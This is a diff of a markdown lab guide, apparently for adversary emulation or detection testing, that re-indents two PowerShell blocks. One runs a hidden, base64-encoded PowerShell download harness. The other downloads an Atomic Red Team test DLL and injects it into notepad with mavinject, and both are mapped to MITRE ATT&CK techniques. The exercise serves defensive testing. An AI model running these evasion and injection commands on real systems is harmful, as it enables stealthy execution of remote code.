@@ -111,15 +111,15 @@ Execute it again, but this time as a **Hidden & Encoded Powershell Download Harn
 - MITRE ATT&CK Technique: [ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)
 - MITRE ATT&CK Technique: [ATT&CK T1027 - Evasion - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	# Encoded and Hidden Powershell Download Harness
-	Write-Host -ForegroundColor Cyan "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
-	$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
-	)
-	Write-Host -ForegroundColor Cyan "Running Command:"
-	Write-Host -ForegroundColor Green "powershell.exe -win H -NoP -e '$EncodedCommand'"
-	powershell.exe -win H -NoP -e $EncodedCommand
-	```
+```PowerShell
+# Encoded and Hidden Powershell Download Harness
+Write-Host -ForegroundColor Cyan "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
+$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
+)
+Write-Host -ForegroundColor Cyan "Running Command:"
+Write-Host -ForegroundColor Green "powershell.exe -win H -NoP -e '$EncodedCommand'"
+powershell.exe -win H -NoP -e $EncodedCommand
+```
 
 w> This will hide your browser, you may need to open a new browser after performing this command.
 
@@ -133,19 +133,19 @@ w> This will hide your browser, you may need to open a new browser after perform
 - [ATT&CK T1218.013 - Defense Evasion - Signed Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/013)
 - [ATT&CK T1055.001 - Defense Evasion - Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	# Signed Binary Proxy Execution w/ mavinject.exe
-	Write-Host -ForegroundColor Cyan "Initiating a T1218.013 - Signed Binary Proxy Execution using mavinject.exe"
-	$malwareURL = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"
-	# start and inject into notepad or calc
-	$targetProcessName = "notepad"
-	$cmd = @"
-		`$targetProcessId = (Start-Process $targetProcessName -PassThru).id
-		Invoke-WebRequest $malwareURL -OutFile "$env:temp\T1055.001.dll"
-		mavinject `$targetProcessId /INJECTRUNNING $env:temp\T1055.001.dll
-		Start-Sleep -m $n
-	"@
-	powershell.exe -nop -command $cmd
-	```
+```PowerShell
+# Signed Binary Proxy Execution w/ mavinject.exe
+Write-Host -ForegroundColor Cyan "Initiating a T1218.013 - Signed Binary Proxy Execution using mavinject.exe"
+$malwareURL = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"
+# start and inject into notepad or calc
+$targetProcessName = "notepad"
+$cmd = @"
+	`$targetProcessId = (Start-Process $targetProcessName -PassThru).id
+	Invoke-WebRequest $malwareURL -OutFile "$env:temp\T1055.001.dll"
+	mavinject `$targetProcessId /INJECTRUNNING $env:temp\T1055.001.dll
+	Start-Sleep -m $n
+"@
+powershell.exe -nop -command $cmd
+```
 
-	s> If you are successful, the code we are injecting will force notepad to run a popup that says "Locked and Loaded".
+s> If you are successful, the code we are injecting will force notepad to run a popup that says "Locked and Loaded".
